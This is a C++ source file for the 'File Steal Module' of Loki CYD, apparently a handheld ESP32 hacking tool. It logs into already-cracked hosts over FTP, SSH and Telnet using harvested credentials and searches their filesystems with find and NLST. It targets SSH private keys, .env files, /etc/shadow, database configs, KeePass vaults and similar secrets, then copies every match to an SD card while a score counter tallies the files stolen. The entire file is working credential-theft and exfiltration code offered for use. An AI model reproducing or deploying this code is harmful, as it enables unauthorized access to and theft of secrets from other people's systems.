// =============================================================================
// Loki CYD — File Steal Module
// Exfiltrates target files from cracked hosts via FTP, SSH, Telnet.
// Matching original Loki's steal_file_names and steal_file_extensions.
// All stolen files saved to SD card at /loki/stolen/<ip>/<filename>
// =============================================================================

#include "loki_steal.h"
#include "loki_config.h"
#include "loki_pet.h"
#include "loki_score.h"
#include "loki_sprites.h"
#include "loki_recon.h"
#include <WiFiClient.h>
#include <SD.h>
#include <SPI.h>
#include <libssh/libssh.h>

namespace LokiSteal {

static uint16_t KF_INFO    = 0x07FF;  // default cyan
static uint16_t KF_SUCCESS = 0x3DE9;  // default green

static void cacheColors() {
    KF_INFO    = LokiPet::kfInfo();
    KF_SUCCESS = LokiPet::kfSuccess();
}

// ── Target file names (from original Loki shared_config.json) ──
static const char* const STEAL_NAMES[] PROGMEM = {
    "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519",
    "authorized_keys", "known_hosts", ".netrc", ".pgpass", ".my.cnf",
    ".env", ".bashrc", ".bash_history", ".zsh_history",
    "wp-config.php", "config.php", "settings.py", "database.yml",
    ".htaccess", ".htpasswd", "credentials", "secrets",
    "hack.txt", "ssh.csv"
};
static const int STEAL_NAME_COUNT = sizeof(STEAL_NAMES) / sizeof(STEAL_NAMES[0]);

// ── Target file extensions ──
static const char* const STEAL_EXTS[] PROGMEM = {
    ".bjorn", ".hack", ".flag", ".pem", ".key", ".p12", ".pfx",
    ".sql", ".sqlite", ".db", ".csv", ".kdbx", ".kdb"
};
static const int STEAL_EXT_COUNT = sizeof(STEAL_EXTS) / sizeof(STEAL_EXTS[0]);

// ── Path-based targets (match end of full path) ──
static const char* const STEAL_PATHS[] PROGMEM = {
    "/etc/passwd", "/etc/shadow"
};
static const int STEAL_PATH_COUNT = sizeof(STEAL_PATHS) / sizeof(STEAL_PATHS[0]);

static WiFiClient stealClient;

static void ipToStr(uint8_t* ip, char* buf, int len) {
    snprintf(buf, len, "%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3]);
}

// ── Check if a filename matches our steal targets ──
static bool isTargetFile(const char* path) {
    // Extract basename
    const char* basename = strrchr(path, '/');
    basename = basename ? basename + 1 : path;

    // Check exact name match
    for (int i = 0; i < STEAL_NAME_COUNT; i++) {
        if (strcmp(basename, STEAL_NAMES[i]) == 0) return true;
    }

    // Check extension match
    const char* ext = strrchr(basename, '.');
    if (ext) {
        for (int i = 0; i < STEAL_EXT_COUNT; i++) {
            if (strcmp(ext, STEAL_EXTS[i]) == 0) return true;
        }
    }

    // Check path-based match (e.g. /etc/passwd)
    for (int i = 0; i < STEAL_PATH_COUNT; i++) {
        int plen = strlen(STEAL_PATHS[i]);
        int flen = strlen(path);
        if (flen >= plen && strcmp(path + flen - plen, STEAL_PATHS[i]) == 0) return true;
    }

    return false;
}

// ── Save file data to SD card ──
static bool saveToSD(const char* ipStr, const char* remotePath, const uint8_t* data, int len) {
    const char* basename = strrchr(remotePath, '/');
    basename = basename ? basename + 1 : remotePath;

    char sdPath[96];
    snprintf(sdPath, sizeof(sdPath), "/loki/stolen/%s/%s", ipStr, basename);

    if (!LokiSprites::sdMount()) {
        Serial.println("[STEAL] SD mount failed");
        return false;
    }

    char dir[64];
    snprintf(dir, sizeof(dir), "/loki/stolen/%s", ipStr);
    SD.mkdir("/loki/stolen");
    SD.mkdir(dir);

    File f = SD.open(sdPath, FILE_WRITE);
    if (!f) {
        Serial.printf("[STEAL] SD open failed: %s\n", sdPath);
        LokiSprites::sdUnmount();
        return false;
    }
    f.write(data, len);
    f.close();
    Serial.printf("[STEAL] Saved %d bytes to %s\n", len, sdPath);
    LokiSprites::sdUnmount();

    LokiScoreManager::addFileStolen();
    return true;
}

// =============================================================================
// FTP FILE STEAL
// =============================================================================

// Read FTP response line into buffer, return response code
static int ftpReadResp(WiFiClient& c, char* buf, int bufLen, unsigned long timeoutMs = 3000) {
    unsigned long t0 = millis();
    int pos = 0;
    while (c.connected() && millis() - t0 < timeoutMs && pos < bufLen - 1) {
        while (c.available() && pos < bufLen - 1) {
            char ch = c.read();
            buf[pos++] = ch;
            if (ch == '\n') goto done;
        }
        vTaskDelay(pdMS_TO_TICKS(20));
    }
done:
    buf[pos] = 0;
    return atoi(buf);
}

// Send FTP command
static void ftpCmd(WiFiClient& c, const char* cmd) {
    c.print(cmd);
    c.print("\r\n");
}

// Recursive FTP directory listing to find target files
// Results stored in matchPaths array, returns count found
#define MAX_STEAL_MATCHES 32
static char stealMatches[MAX_STEAL_MATCHES][80];
static int stealMatchCount = 0;

static void ftpDiscoverFiles(WiFiClient& ctrl, const char* dir, int depth) {
    if (depth > STEAL_MAX_DEPTH || stealMatchCount >= MAX_STEAL_MATCHES || !LokiRecon::isRunning()) return;

    char buf[256];

    // CWD to directory
    char cmd[96];
    snprintf(cmd, sizeof(cmd), "CWD %s", dir);
    ftpCmd(ctrl, cmd);
    int code = ftpReadResp(ctrl, buf, sizeof(buf));
    if (code != 250) return;

    // PASV mode for NLST
    ftpCmd(ctrl, "PASV");
    code = ftpReadResp(ctrl, buf, sizeof(buf));
    if (code != 227) return;

    // Parse PASV response: 227 Entering Passive Mode (h1,h2,h3,h4,p1,p2)
    char* start = strchr(buf, '(');
    if (!start) return;
    int h1, h2, h3, h4, p1, p2;
    if (sscanf(start, "(%d,%d,%d,%d,%d,%d)", &h1, &h2, &h3, &h4, &p1, &p2) != 6) return;

    IPAddress dataIP(h1, h2, h3, h4);
    uint16_t dataPort = p1 * 256 + p2;

    WiFiClient dataConn;
    if (!dataConn.connect(dataIP, dataPort, 2000)) return;

    ftpCmd(ctrl, "NLST");
    code = ftpReadResp(ctrl, buf, sizeof(buf));
    if (code != 150 && code != 125) {
        dataConn.stop();
        return;
    }

    // Read file listing from data connection
    String listing = "";
    unsigned long t0 = millis();
    while (dataConn.connected() && millis() - t0 < 10000 && listing.length() < 4096) {
        while (dataConn.available() && listing.length() < 4096) {
            listing += (char)dataConn.read();
        }
        vTaskDelay(1);
    }
    dataConn.stop();

    // Read transfer complete
    ftpReadResp(ctrl, buf, sizeof(buf));

    // Parse listing line by line
    int startIdx = 0;
    while (startIdx < (int)listing.length() && stealMatchCount < MAX_STEAL_MATCHES) {
        int nlIdx = listing.indexOf('\n', startIdx);
        if (nlIdx < 0) nlIdx = listing.length();

        String item = listing.substring(startIdx, nlIdx);
        item.trim();
        startIdx = nlIdx + 1;

        if (item.length() == 0 || item == "." || item == "..") continue;

        // Build full path
        char fullPath[80];
        if (strcmp(dir, "/") == 0) {
            snprintf(fullPath, sizeof(fullPath), "/%s", item.c_str());
        } else {
            snprintf(fullPath, sizeof(fullPath), "%s/%s", dir, item.c_str());
        }

        // Try to CWD into it to test if it's a directory
        char testCmd[96];
        snprintf(testCmd, sizeof(testCmd), "CWD %s", fullPath);
        ftpCmd(ctrl, testCmd);
        code = ftpReadResp(ctrl, buf, sizeof(buf));
        if (code == 250) {
            // It's a directory — recurse, then CWD back
            ftpCmd(ctrl, "CDUP");
            ftpReadResp(ctrl, buf, sizeof(buf));
            ftpDiscoverFiles(ctrl, fullPath, depth + 1);
        } else {
            // It's a file — check if it matches
            if (isTargetFile(fullPath)) {
                strncpy(stealMatches[stealMatchCount], fullPath, 79);
                stealMatches[stealMatchCount][79] = 0;
                stealMatchCount++;
            }
        }
    }
}

int stealFTP(uint8_t* ip, const char* user, const char* pass) {
    if (!LokiSprites::sdAvailable()) return 0;

    char ipStr[16];
    ipToStr(ip, ipStr, sizeof(ipStr));
    IPAddress devIP(ip[0], ip[1], ip[2], ip[3]);

    LokiPet::setMood(MOOD_STEALING);
    LokiPet::setStatus("FTPSteal", ipStr);

    char msg[52];
    snprintf(msg, sizeof(msg), "[>] FTP steal %s", ipStr);
    LokiPet::addKillLine(msg, KF_INFO);

    if (!stealClient.connect(devIP, 21, 3000)) return 0;

    char buf[256];
    ftpReadResp(stealClient, buf, sizeof(buf)); // 220 banner

    // Login
    char cmd[48];
    snprintf(cmd, sizeof(cmd), "USER %s", user);
    ftpCmd(stealClient, cmd);
    ftpReadResp(stealClient, buf, sizeof(buf));

    snprintf(cmd, sizeof(cmd), "PASS %s", pass);
    ftpCmd(stealClient, cmd);
    int code = ftpReadResp(stealClient, buf, sizeof(buf));
    if (code != 230) {
        stealClient.stop();
        return 0;
    }

    // Discover target files
    stealMatchCount = 0;
    ftpDiscoverFiles(stealClient, "/", 0);

    int stolen = 0;

    // Download each matching file via RETR
    for (int i = 0; i < stealMatchCount && LokiRecon::isRunning(); i++) {
        // PASV + RETR
        ftpCmd(stealClient, "PASV");
        code = ftpReadResp(stealClient, buf, sizeof(buf));
        if (code != 227) continue;

        char* start = strchr(buf, '(');
        if (!start) continue;
        int h1, h2, h3, h4, p1, p2;
        if (sscanf(start, "(%d,%d,%d,%d,%d,%d)", &h1, &h2, &h3, &h4, &p1, &p2) != 6) continue;

        IPAddress dataIP(h1, h2, h3, h4);
        uint16_t dataPort = p1 * 256 + p2;

        // SIZE check
        snprintf(cmd, sizeof(cmd), "SIZE %s", stealMatches[i]);
        ftpCmd(stealClient, cmd);
        code = ftpReadResp(stealClient, buf, sizeof(buf));
        if (code == 213) {
            long fileSize = atol(buf + 4);
            if (fileSize > STEAL_MAX_FILE_SIZE) continue;
        }

        WiFiClient dataConn;
        if (!dataConn.connect(dataIP, dataPort, 2000)) continue;

        snprintf(cmd, sizeof(cmd), "RETR %s", stealMatches[i]);
        ftpCmd(stealClient, cmd);
        code = ftpReadResp(stealClient, buf, sizeof(buf));
        if (code != 150 && code != 125) {
            dataConn.stop();
            continue;
        }

        // Read file data
        uint8_t* fileData = (uint8_t*)malloc(STEAL_MAX_FILE_SIZE);
        if (!fileData) { dataConn.stop(); continue; }

        int fileLen = 0;
        unsigned long t0 = millis();
        while (dataConn.connected() && millis() - t0 < 15000 && fileLen < STEAL_MAX_FILE_SIZE) {
            int avail = dataConn.available();
            if (avail > 0) {
                int toRead = min(avail, STEAL_MAX_FILE_SIZE - fileLen);
                dataConn.read(fileData + fileLen, toRead);
                fileLen += toRead;
            }
            vTaskDelay(1);
        }
        dataConn.stop();
        ftpReadResp(stealClient, buf, sizeof(buf)); // 226 transfer complete

        if (fileLen > 0 && saveToSD(ipStr, stealMatches[i], fileData, fileLen)) {
            stolen++;
            snprintf(msg, sizeof(msg), "[+] STOLE %s:%s", ipStr, stealMatches[i]);
            LokiPet::addKillLine(msg, KF_SUCCESS);
        }
        free(fileData);
        vTaskDelay(1);
    }

    ftpCmd(stealClient, "QUIT");
    delay(100);
    stealClient.stop();

    if (stolen > 0) {
        snprintf(msg, sizeof(msg), "[*] FTP %s: %d files stolen", ipStr, stolen);
        LokiPet::addKillLine(msg, KF_SUCCESS);
    }
    return stolen;
}

// =============================================================================
// SSH FILE STEAL (via exec channel)
// =============================================================================

// Execute a command over SSH and capture output
static int sshExec(ssh_session session, const char* cmd, char* output, int maxLen) {
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) return -1;

    if (ssh_channel_open_session(channel) != SSH_OK) {
        ssh_channel_free(channel);
        return -1;
    }

    if (ssh_channel_request_exec(channel, cmd) != SSH_OK) {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }

    int totalRead = 0;
    unsigned long t0 = millis();
    while (!ssh_channel_is_eof(channel) && millis() - t0 < 30000 && totalRead < maxLen - 1) {
        int nbytes = ssh_channel_read_timeout(channel, output + totalRead, maxLen - 1 - totalRead, 0, 2000);
        if (nbytes > 0) {
            totalRead += nbytes;
        } else if (nbytes == 0) {
            break;
        } else {
            break;
        }
        vTaskDelay(1);
    }
    output[totalRead] = 0;

    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    return totalRead;
}

int stealSSH(uint8_t* ip, const char* user, const char* pass) {
    if (!LokiSprites::sdAvailable()) return 0;

    char ipStr[16];
    ipToStr(ip, ipStr, sizeof(ipStr));

    LokiPet::setMood(MOOD_STEALING);
    LokiPet::setStatus("SSHSteal", ipStr);

    char msg[52];
    snprintf(msg, sizeof(msg), "[>] SSH steal %s", ipStr);
    LokiPet::addKillLine(msg, KF_INFO);

    // Connect and auth
    ssh_session session = ssh_new();
    if (!session) return 0;

    ssh_options_set(session, SSH_OPTIONS_HOST, ipStr);
    ssh_options_set(session, SSH_OPTIONS_USER, user);
    int port = 22;
    ssh_options_set(session, SSH_OPTIONS_PORT, &port);
    long timeout = 10;
    ssh_options_set(session, SSH_OPTIONS_TIMEOUT, &timeout);

    if (ssh_connect(session) != SSH_OK) {
        ssh_free(session);
        return 0;
    }

    if (ssh_userauth_password(session, NULL, pass) != SSH_AUTH_SUCCESS) {
        ssh_disconnect(session);
        ssh_free(session);
        return 0;
    }

    // Run find to discover files
    char* findOutput = (char*)malloc(8192);
    if (!findOutput) {
        ssh_disconnect(session);
        ssh_free(session);
        return 0;
    }

    const char* findCmd = "find / -maxdepth 5 -type f "
        "! -path '/proc/*' ! -path '/sys/*' ! -path '/dev/*' "
        "! -path '/run/*' ! -path '/snap/*' "
        "-size -64k 2>/dev/null | head -500";

    Serial.println("[STEAL] SSH: running find...");
    int findLen = sshExec(session, findCmd, findOutput, 8192);
    Serial.printf("[STEAL] SSH: find returned %d bytes\n", findLen);
    if (findLen <= 0) {
        free(findOutput);
        ssh_disconnect(session);
        ssh_free(session);
        return 0;
    }

    // Parse find output and filter for target files
    stealMatchCount = 0;
    char* line = strtok(findOutput, "\n");
    while (line && stealMatchCount < MAX_STEAL_MATCHES) {
        while (*line == ' ' || *line == '\r') line++;
        if (*line && isTargetFile(line)) {
            Serial.printf("[STEAL] SSH match: %s\n", line);
            strncpy(stealMatches[stealMatchCount], line, 79);
            stealMatches[stealMatchCount][79] = 0;
            stealMatchCount++;
        }
        line = strtok(NULL, "\n");
    }
    free(findOutput);
    Serial.printf("[STEAL] SSH: %d target files found\n", stealMatchCount);

    int stolen = 0;

    // Cat each matching file
    for (int i = 0; i < stealMatchCount && LokiRecon::isRunning(); i++) {
        char catCmd[128];
        snprintf(catCmd, sizeof(catCmd), "cat '%s' 2>/dev/null", stealMatches[i]);

        uint8_t* fileData = (uint8_t*)malloc(STEAL_MAX_FILE_SIZE);
        if (!fileData) continue;

        int fileLen = sshExec(session, catCmd, (char*)fileData, STEAL_MAX_FILE_SIZE);
        Serial.printf("[STEAL] SSH cat %s: %d bytes\n", stealMatches[i], fileLen);
        if (fileLen > 0) {
            bool saved = saveToSD(ipStr, stealMatches[i], fileData, fileLen);
            Serial.printf("[STEAL] SSH save %s: %s\n", stealMatches[i], saved ? "OK" : "FAIL");
            if (saved) {
                stolen++;
                snprintf(msg, sizeof(msg), "[+] STOLE %s:%s", ipStr, stealMatches[i]);
                LokiPet::addKillLine(msg, KF_SUCCESS);
            }
        }
        free(fileData);
        vTaskDelay(1);
    }

    ssh_disconnect(session);
    ssh_free(session);

    if (stolen > 0) {
        snprintf(msg, sizeof(msg), "[*] SSH %s: %d files stolen", ipStr, stolen);
        LokiPet::addKillLine(msg, KF_SUCCESS);
    }
    return stolen;
}

// =============================================================================
// TELNET FILE STEAL (via shell commands)
// =============================================================================

// Read from telnet until a shell prompt or timeout
static int telnetReadUntilPrompt(WiFiClient& c, char* buf, int maxLen, unsigned long timeoutMs = 5000) {
    unsigned long t0 = millis();
    int pos = 0;
    while (c.connected() && millis() - t0 < timeoutMs && pos < maxLen - 1) {
        while (c.available() && pos < maxLen - 1) {
            buf[pos++] = c.read();
            t0 = millis(); // reset timeout on data
        }
        // Check for shell prompt
        if (pos > 0) {
            char last = buf[pos - 1];
            if (last == '$' || last == '#' || last == '>' || last == '%') {
                // Check it's not mid-line data
                if (pos < 2 || buf[pos - 2] == ' ' || buf[pos - 2] == '\n') break;
            }
        }
        vTaskDelay(pdMS_TO_TICKS(20));
    }
    buf[pos] = 0;
    return pos;
}

// Send command via telnet and read response
static int telnetExec(WiFiClient& c, const char* cmd, char* output, int maxLen) {
    c.printf("%s\r\n", cmd);
    delay(200);

    // Read until prompt
    int len = telnetReadUntilPrompt(c, output, maxLen, 30000);

    // Strip first line (echo of command)
    char* firstNl = strchr(output, '\n');
    if (firstNl) {
        int skip = firstNl - output + 1;
        memmove(output, firstNl + 1, len - skip + 1);
        len -= skip;
    }

    // Strip last line (prompt)
    if (len > 0) {
        char* lastNl = strrchr(output, '\n');
        if (lastNl) {
            *lastNl = 0;
            len = lastNl - output;
        }
    }

    return len;
}

int stealTelnet(uint8_t* ip, const char* user, const char* pass) {
    if (!LokiSprites::sdAvailable()) return 0;

    char ipStr[16];
    ipToStr(ip, ipStr, sizeof(ipStr));
    IPAddress devIP(ip[0], ip[1], ip[2], ip[3]);

    LokiPet::setMood(MOOD_STEALING);
    LokiPet::setStatus("TelnetSteal", ipStr);

    char msg[52];
    snprintf(msg, sizeof(msg), "[>] Telnet steal %s", ipStr);
    LokiPet::addKillLine(msg, KF_INFO);

    if (!stealClient.connect(devIP, 23, 3000)) {
        Serial.println("[STEAL] Telnet: connect failed");
        return 0;
    }

    char buf[512];

    // Wait for login prompt
    telnetReadUntilPrompt(stealClient, buf, sizeof(buf), 5000);
    Serial.printf("[STEAL] Telnet login prompt: %.60s\n", buf);

    // Send username
    stealClient.printf("%s\r\n", user);
    delay(500);
    telnetReadUntilPrompt(stealClient, buf, sizeof(buf), 3000);

    // Send password
    stealClient.printf("%s\r\n", pass);
    delay(1000);
    int respLen = telnetReadUntilPrompt(stealClient, buf, sizeof(buf), 5000);
    Serial.printf("[STEAL] Telnet shell resp (%d bytes): %.80s\n", respLen, buf);

    // Verify we got a shell
    String resp = String(buf);
    resp.toLowerCase();
    if (resp.indexOf("incorrect") >= 0 || resp.indexOf("denied") >= 0 ||
        resp.indexOf("failed") >= 0 || resp.indexOf("invalid") >= 0) {
        Serial.println("[STEAL] Telnet: auth failed");
        stealClient.stop();
        return 0;
    }

    // Run find to discover files
    char* findOutput = (char*)malloc(8192);
    if (!findOutput) {
        stealClient.stop();
        return 0;
    }

    Serial.println("[STEAL] Telnet: running find...");
    int findLen = telnetExec(stealClient,
        "find / -maxdepth 5 -type f "
        "! -path '/proc/*' ! -path '/sys/*' ! -path '/dev/*' "
        "! -path '/run/*' ! -path '/snap/*' "
        "-size -64k 2>/dev/null | head -500",
        findOutput, 8192);
    Serial.printf("[STEAL] Telnet: find returned %d bytes\n", findLen);

    if (findLen <= 0) {
        Serial.println("[STEAL] Telnet: find returned nothing");
        free(findOutput);
        stealClient.stop();
        return 0;
    }

    // Parse and filter
    stealMatchCount = 0;
    char* line = strtok(findOutput, "\r\n");
    while (line && stealMatchCount < MAX_STEAL_MATCHES) {
        while (*line == ' ') line++;
        // Strip trailing whitespace
        int ll = strlen(line);
        while (ll > 0 && (line[ll-1] == '\r' || line[ll-1] == ' ')) line[--ll] = 0;
        if (*line && isTargetFile(line)) {
            Serial.printf("[STEAL] Telnet match: %s\n", line);
            strncpy(stealMatches[stealMatchCount], line, 79);
            stealMatches[stealMatchCount][79] = 0;
            stealMatchCount++;
        }
        line = strtok(NULL, "\r\n");
    }
    free(findOutput);
    Serial.printf("[STEAL] Telnet: %d target files found\n", stealMatchCount);

    int stolen = 0;

    // Cat each matching file
    for (int i = 0; i < stealMatchCount && LokiRecon::isRunning(); i++) {
        char catCmd[128];
        snprintf(catCmd, sizeof(catCmd), "cat '%s' 2>/dev/null", stealMatches[i]);

        uint8_t* fileData = (uint8_t*)malloc(STEAL_MAX_FILE_SIZE);
        if (!fileData) continue;

        int fileLen = telnetExec(stealClient, catCmd, (char*)fileData, STEAL_MAX_FILE_SIZE);
        Serial.printf("[STEAL] Telnet cat %s: %d bytes\n", stealMatches[i], fileLen);
        if (fileLen > 0) {
            bool saved = saveToSD(ipStr, stealMatches[i], fileData, fileLen);
            Serial.printf("[STEAL] Telnet save %s: %s\n", stealMatches[i], saved ? "OK" : "FAIL");
            if (saved) {
                stolen++;
                snprintf(msg, sizeof(msg), "[+] STOLE %s:%s", ipStr, stealMatches[i]);
                LokiPet::addKillLine(msg, KF_SUCCESS);
            }
        }
        free(fileData);
        vTaskDelay(1);
    }

    stealClient.printf("exit\r\n");
    delay(100);
    stealClient.stop();

    if (stolen > 0) {
        snprintf(msg, sizeof(msg), "[*] Telnet %s: %d files stolen", ipStr, stolen);
        LokiPet::addKillLine(msg, KF_SUCCESS);
    }
    return stolen;
}

// =============================================================================
// STEAL FROM DEVICE — dispatch based on cracked ports
// =============================================================================

// Find credentials for a specific IP + port from the cred log
static bool findCred(uint8_t* ip, uint16_t port, const char*& user, const char*& pass) {
    LokiCredEntry* creds = LokiRecon::getCredLog();
    int count = LokiRecon::getCredLogCount();
    for (int i = 0; i < count; i++) {
        if (memcmp(creds[i].ip, ip, 4) == 0 && creds[i].port == port) {
            user = creds[i].user;
            pass = creds[i].pass;
            return true;
        }
    }
    return false;
}

int stealFromDevice(LokiDevice& dev) {
    if (dev.status != STATUS_CRACKED) return 0;
    if (!LokiSprites::sdAvailable()) return 0;
    if (!LokiRecon::isRunning()) return 0;

    cacheColors();

    char dbgIp[16];
    ipToStr(dev.ip, dbgIp, sizeof(dbgIp));
    Serial.printf("[STEAL] stealFromDevice %s crackedPorts=0x%02X\n", dbgIp, dev.crackedPorts);

    int total = 0;
    const char* user; const char* pass;

    if ((dev.crackedPorts & PORT_SSH) && LokiRecon::isRunning()) {
        if (findCred(dev.ip, 22, user, pass)) {
            Serial.printf("[STEAL] SSH steal %s with %s:%s\n", dbgIp, user, pass);
            total += stealSSH(dev.ip, user, pass);
            Serial.printf("[STEAL] SSH steal done, got %d total\n", total);
        }
    }
    if ((dev.crackedPorts & PORT_FTP) && LokiRecon::isRunning()) {
        if (findCred(dev.ip, 21, user, pass)) {
            Serial.printf("[STEAL] FTP steal %s with %s:%s\n", dbgIp, user, pass);
            int ftpCount = stealFTP(dev.ip, user, pass);
            total += ftpCount;
            Serial.printf("[STEAL] FTP steal done, got %d\n", ftpCount);
        }
    }
    if ((dev.crackedPorts & PORT_TELNET) && LokiRecon::isRunning()) {
        if (findCred(dev.ip, 23, user, pass)) {
            Serial.printf("[STEAL] Telnet steal %s with %s:%s\n", dbgIp, user, pass);
            int telCount = stealTelnet(dev.ip, user, pass);
            total += telCount;
            Serial.printf("[STEAL] Telnet steal done, got %d\n", telCount);
        }
    }

    return total;
}

}  // namespace LokiSteal
